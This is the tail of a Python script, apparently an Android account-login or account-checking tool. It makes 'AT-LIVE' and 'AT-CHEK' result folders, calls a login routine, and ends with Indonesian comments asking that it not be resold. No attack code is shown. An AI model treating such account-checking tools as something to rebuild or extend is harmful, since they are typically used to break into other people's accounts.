			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
#<----------[__MAIN__]------------->#
if __name__=='__main__':
	try:os.mkdir('/sdcard/AT-LIVE')
	except:pass
	try:os.mkdir('/sdcard/AT-CHEK')
	except:pass
	login_at()
# INGET JANGAN DIPERJUAL BELIKAN BLOK
# JANGAN BERHARAP YG TIDAK PASTI
# OPREK AJA BIAR FULL IJO
# MAKASIH AUGTHOR KANG OPREK:)
# AT_GANTENG YA KAN :)